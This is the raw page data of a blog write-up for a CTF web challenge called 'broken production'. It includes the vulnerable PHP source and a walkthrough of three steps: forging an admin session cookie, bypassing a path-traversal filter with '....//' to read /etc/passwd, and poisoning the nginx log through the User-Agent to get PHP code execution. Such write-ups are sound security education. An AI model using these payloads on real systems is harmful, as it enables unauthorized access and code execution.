1:"$Sreact.fragment"
2:I[87555,[],""]
3:I[31295,[],""]
4:I[6874,["874","static/chunks/874-c62c375efd21db20.js","319","static/chunks/app/writeups/layout-6eb8da7f54d57912.js"],""]
6:I[59665,[],"MetadataBoundary"]
8:I[59665,[],"OutletBoundary"]
b:I[74911,[],"AsyncMetadataOutlet"]
d:I[59665,[],"ViewportBoundary"]
f:I[26614,[],""]
:HL["/_next/static/media/a34f9d1faa5f3315-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]
:HL["/_next/static/css/f67679a4dcf042a1.css","style"]
0:{"P":null,"b":"LXc6w6ftcfUymS_FwiDab","p":"","c":["","writeups","55b783ecf750b20dfd3d58cf58530ecd"],"i":false,"f":[[["",{"children":["writeups",{"children":[["id","55b783ecf750b20dfd3d58cf58530ecd","d"],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/f67679a4dcf042a1.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"className":"dark scroll-smooth","children":[["$","head",null,{"children":["$","meta",null,{"charSet":"utf-8"}]}],["$","body",null,{"className":"text-dark dark:text-white dark:bg-midnight","style":{"fontFamily":"'Inter', 'Inter Fallback'","fontStyle":"normal"},"children":["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","div",null,{"className":"h-screen flex items-center justify-center","children":["$","main",null,{"className":"relative pl-14","children":[["$","svg",null,{"stroke":"currentColor","fill":"currentColor","strokeWidth":"0","viewBox":"0 0 512 512","className":"absolute left-0 top-2 text-5xl text-grapefruit","children":["$undefined",[["$","path","0",{"d":"M256 48C140.559 48 48 140.559 48 256c0 115.436 92.559 208 208 208 115.435 0 208-92.564 208-208 0-115.441-92.564-208-208-208zm104.002 282.881l-29.12 29.117L256 285.117l-74.881 74.881-29.121-29.117L226.881 256l-74.883-74.881 29.121-29.116L256 226.881l74.881-74.878 29.12 29.116L285.119 256l74.883 74.881z","children":"$undefined"}]]],"style":{"color":"$undefined"},"height":"1em","width":"1em","xmlns":"http://www.w3.org/2000/svg"}],["$","h1",null,{"className":"font-bold text-7xl underline decoration-grapefruit mb-5","children":"404."}],["$","p",null,{"children":"Your requested page was not found."}],["$","$L4",null,{"href":"/","className":"font-medium text-inherit","children":"Return to home →"}]]}]}],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]}]]}]]}],{"children":["writeups",["$","$1","c",{"children":[null,["$","main",null,{"className":"container pt-20 pb-24","children":[["$","$L4",null,{"href":"/","className":"text-secondary text-sm mb-10 -ml-5 block w-max","children":"← Back to home"}],["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}]]}],{"children":[["id","55b783ecf750b20dfd3d58cf58530ecd","d"],["$","$1","c",{"children":[null,["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":["__PAGE__",["$","$1","c",{"children":["$L5",["$","$L6",null,{"children":"$L7"}],null,["$","$L8",null,{"children":["$L9","$La",["$","$Lb",null,{"promise":"$@c"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],["$","$1","h",{"children":[null,["$","$1","Seoatj4CMtkbuh7OFUvzT",{"children":[["$","$Ld",null,{"children":"$Le"}],["$","meta",null,{"name":"next-size-adjust","content":""}]]}],null]}],false]],"m":"$undefined","G":["$f","$undefined"],"s":false,"S":true}
10:"$Sreact.suspense"
11:I[74911,[],"AsyncMetadata"]
7:["$","$10",null,{"fallback":null,"children":["$","$L11",null,{"promise":"$@12"}]}]
a:null
e:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}]]
9:null
12:{"metadata":[["$","title","0",{"children":"kevin.fish"}]],"error":null,"digest":"$undefined"}
c:{"metadata":"$12:metadata","error":null,"digest":"$undefined"}
13:I[50674,["325","static/chunks/325-8cc74193b249521f.js","134","static/chunks/app/writeups/%5Bid%5D/page-b6fc1eb85fdc5690.js"],"default"]
14:T73d,<?php
spl_autoload_register(function ($name){
    if (preg_match('/Controller$/', $name))
    {
        $name = "controllers/${name}";
    }
    else if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

$session  = new SessionHandler();
$database = new Database('/tmp/challenge.db');

$router = new Router();
$router->new('GET', '/', function($router) use ($session){
    if (!$session->isLoggedIn()) 
    {
        return header('location: /login');
    }

    return $router->view('index', ['admin' => $session->isAdmin(), 'username' => $session->getUsername()]);
});

$router->new('GET', '/login', function($router)  use ($session){
    if ($session->isLoggedIn()) 
    {
        return header('location: /');
    }

    return $router->view('login');
});

$router->new('GET', '/register', function($router)  use ($session){
    if ($session->isLoggedIn()) 
    {
        return header('location: /');
    }

    return $router->view('register');
});

$router->new('POST', '/auth/login', function($router) use ($database, $session){
    $user = $database->login($_POST['username'], $_POST['password']);
    if (!$user) return header('location: /login?msg=Invalid username or password!');
    $session->login($_POST['username']);
    header('location: /');
    exit;
});

$router->new('POST', '/auth/register', function($router)  use ($database){
    if ($_POST['username'] === 'admin') return header('location: /register?msg=This user already exists!');
    $database->register($_POST['username'], $_POST['password']);
    header('location: /login?msg=The account registered successfully!&reg=true');
    exit;
});


$router->new('GET', '/logout', function($router)  use ($session){
    
    $session->distroy();
    return header('location: /login');
    
});


die($router->match());15:Tacb,<?php

$utilFile = "tickets.php";

if (isset($_GET['util']))
	$utilFile = $_GET['util'];
	$utilFile = str_replace("../","", $utilFile);

$fullPath = '/www/utils/'.$utilFile;

?>
<!DOCTYPE html>
<html lang="en">
<head>
	<title>Broken Production</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- ... -->
</head>
<body>
	
	<body>
    <div id="wrapper">
        <!-- Sidebar -->
        <div id="sidebar-wrapper">
            <ul class="sidebar-nav">
                <li class="sidebar-brand">
                    <a href="#">
                        Admin Dashboard (Under Construction)
                    </a>
                </li>
                <div class="profile-sidebar">
                    <!-- SIDEBAR USERPIC -->
                    <div class="profile-userpic">
                        <img src="/static/images/makelaris.png" class="img-responsive" alt="">
                    </div>
                    <!-- END SIDEBAR USERPIC -->
                    <!-- SIDEBAR USER TITLE -->
                    <div class="profile-usertitle">
                        <div class="profile-usertitle-name">
                            <?php echo $username ?>
                        </div>
                        <div class="profile-usertitle-job">
                            Administrator
                        </div>
                    </div>
                    <!-- END SIDEBAR USER TITLE -->
                    <!-- SIDEBAR BUTTONS -->
                    <div class="profile-userbuttons">
                        <a href="/logout" class="btn btn-danger btn-xs">Log Out</a>
                    </div>
                </div>
            </ul>
        </div>
        <!-- /#sidebar-wrapper -->

        <!-- Page Content -->
        <div id="page-content-wrapper">

            <div class="container-fluid">
                <div class="row text-right mb-4">
	                <div class="col">
	                    <select class="custom-select" id="gotoPage">
	                    	<?php 
	                    		echo "<option value='$utilFile' selected='true'>$utilFile</option>";

	                    		$pages = array("logs.php", "tickets.php", "todo.php");
	                    		foreach ($pages as $page){
	                    			if($page != $utilFile){
	                    				echo "<option value='$page'>$page</option>";
	                    			}
	                    		}
	                    	?>
						</select>  
	                </div>    
	            </div>

                <div class="manage-box">
                	<?php include_once($fullPath); ?>
                </div>
            </div>
        </div>
        <!-- /#page-content-wrapper -->

    </div>
</body>
<!-- ... -->

</html>5:["$","div",null,{"children":["$","main",null,{"className":"text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-3 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&>p>code]:bg-black/20 [&>p>code]:text-secondary [&>p>code]:px-2 [&>p>code]:py-1 [&>p>code]:rounded","children":[["$","h1","h1-0",{"children":"Hack the Madness CTF Round 2 — broken production"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"Our PHP devs are working on this employee management portal. We have a mock build of the website and you are to pentest the platform for weaknesses. Your goal is to get more privileges and command execution on the server."}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given a PHP server that looks like this:"}],"\n",["$","$L13","pre-0",{"className":"my-4","children":"$14","language":"php"}],"\n",["$","p","p-1",{"children":["Looking in ",["$","code","code-0",{"children":"views/index.php"}]," and ",["$","code","code-1",{"children":"SessionHandler.php"}],","]}],"\n",["$","$L13","pre-1",{"className":"my-4","children":"<?php if ($admin){\n\t\tinclude_once \"admin.php\";\n\t} else{\n\t\tinclude_once \"user.php\";\n\t}\n?>","language":"php"}],"\n",["$","$L13","pre-2",{"className":"my-4","children":"<?php\nclass SessionHandler\n{\n    public function __construct()\n    {\n        if (!empty($_COOKIE['PHPSESSID'])){\n            $this->cookie = $_COOKIE['PHPSESSID'];\n            $this->load();\n        }\n    }\n\n    public function login($username)\n    {\n        setcookie('PHPSESSID', base64_encode(json_encode([\n            'username' => $username\n        ])), time()+1333337, '/');\n    }\n\n    public function load()\n    {\n        $this->data = json_decode(base64_decode($this->cookie));\n    }\n\n    public function isLoggedIn()\n    {\n        return !is_null($this->data->username);\n    }\n\n    public function isAdmin()\n    {\n        return $this->data->username === 'admin';\n    }\n\n    public function getUsername()\n    {\n        return $this->data->username;\n    }\n\n    public function distroy()\n    {\n        unset($_COOKIE['PHPSESSID']);\n        setcookie('PHPSESSID', '', time() - 3600, '/');\n    }\n}","language":"php"}],"\n",["$","p","p-2",{"children":["it seems we can pretty easily log in as admin by base64 encoding the string ",["$","code","code-0",{"children":"{\"username\":\"admin\"}"}],", e.g. something like"]}],"\n",["$","$L13","pre-3",{"className":"my-4","children":"ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ","language":"$undefined"}],"\n",["$","p","p-3",{"children":["Replacing our ",["$","code","code-0",{"children":"PHPSESSID"}]," cookie with that, we get to the admin dashboard:"]}],"\n",["$","p","p-4",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/41a17715-eea8-447d-9909-ff31140957f5","alt":"image"}]}],"\n",["$","p","p-5",{"children":"Looking at the admin view,"}],"\n",["$","$L13","pre-4",{"className":"my-4","children":"$15","language":"php"}],"\n",["$","p","p-6",{"children":["it looks like we get local file inclusion, but with path traversal blocked by a ",["$","code","code-0",{"children":"str_replace"}],"."]}],"\n",["$","p","p-7",{"children":["However, we can very easily get around this filter by passing a query param such as ",["$","code","code-0",{"children":"....//....//etc/passwd"}],": the script will delete every instance of ",["$","code","code-1",{"children":"../"}],", leaving us with a file inclusion of ",["$","code","code-2",{"children":"/var/www/../../etc/passwd"}],"."]}],"\n",["$","p","p-8",{"children":"We still can't directly include the flag, though; looking at the dockerfile, the flag file's name is randomly generated at build time."}],"\n",["$","$L13","pre-5",{"className":"my-4","children":"FROM alpine:edge\n\n# Setup usr\nRUN adduser -D -u 1000 -g 1000 -s /bin/sh www\n\n# Install system packages\nRUN apk add --no-cache --update supervisor nginx php7-fpm php7-sqlite3 php7-json\n\n# Configure php-fpm and nginx\nCOPY config/fpm.conf /etc/php7/php-fpm.d/www.conf\nCOPY config/supervisord.conf /etc/supervisord.conf\nCOPY config/nginx.conf /etc/nginx/nginx.conf\n\n# Copy challenge files\nCOPY challenge /www\n\n# Copy flag\nRUN RND=$(echo $RANDOM | md5sum | head -c 15) && \\\n\techo \"HTB{f4k3_fl4g_f0r_t3st1ng}\" > /flag_${RND}.txt\n\n# Setup permissions\nRUN chown -R www:www /var/lib/nginx\n\n# Expose the port nginx is listening on\nEXPOSE 80\n\nCMD /usr/bin/supervisord -c /etc/supervisord.conf","language":"Dockerfile"}],"\n",["$","p","p-9",{"children":["Then, we can try to get RCE instead. Looking at the nginx config, we can see\nthat the server logs requests to ",["$","code","code-0",{"children":"/var/log/nginx/access.log"}],":"]}],"\n",["$","$L13","pre-6",{"className":"my-4","children":"user www;\npid /run/nginx.pid;\nerror_log /dev/stderr info;\n\nevents {\n    worker_connections 1024;\n}\n\nhttp {\n    server_tokens off;\n    log_format docker '$remote_addr $remote_user $status \"$request\" \"$http_referer\" \"$http_user_agent\" ';\n    access_log /var/log/nginx/access.log docker;\n\n    charset utf-8;\n    keepalive_timeout 20s;\n    sendfile on;\n    tcp_nopush on;\n    client_max_body_size 1M;\n\n    include /etc/nginx/mime.types;\n\n    server {\n        listen 80;\n        server_name _;\n\n        index index.php;\n        root /www;\n\n        location / {\n            try_files $uri $uri/ /index.php?$query_string;\n            location ~ \\.php$ {\n                try_files $uri =404;\n                fastcgi_pass unix:/run/php-fpm.sock;\n                fastcgi_index index.php;\n                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n                include fastcgi_params;\n            }\n        }\n    }\n}","language":"conf"}],"\n",["$","p","p-10",{"children":"(indeed, one of the tabs in the admin dashboard lets you view this file directly:)"}],"\n",["$","p","p-11",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/8b97dde8-7959-4917-94b3-11134e06b4e0","alt":"image"}]}],"\n",["$","p","p-12",{"children":"Thus, we can write arbitrary PHP code to the log file by manipulating the HTTP user agent, and then include this file via LFI for RCE:"}],"\n",["$","$L13","pre-7",{"className":"my-4","children":"await (await fetch('http://94.237.53.57:54572/', {\n    headers: { 'User-Agent': '<?php phpinfo(); ?>' }\n})).text()","language":"js"}],"\n",["$","p","p-13",{"children":["(which requires Firefox, since Chromium ",["$","a","a-0",{"href":"https://stackoverflow.com/questions/42815087/sending-a-custom-user-agent-string-along-with-my-headers-fetch","children":["disallows setting a custom user agent in ",["$","code","code-0",{"children":"fetch"}]]}],")."]}],"\n",["$","p","p-14",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/06c166c3-9cb5-4b40-bc71-7f61370715d7","alt":"image"}]}],"\n",["$","p","p-15",{"children":"We can use the RCE to give us the flag file name with e.g."}],"\n",["$","$L13","pre-8",{"className":"my-4","children":"await (await fetch(window.location, {\n    headers: { 'User-Agent': '<?php echo `ls /`; ?>' }\n})).text() ","language":"js"}],"\n",["$","p","p-16",{"children":"and include it with LFI to get the flag:"}],"\n",["$","p","p-17",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/31b2d71e-38b9-4918-88ca-ce230ee4d59b","alt":"image"}]}]]}]}]
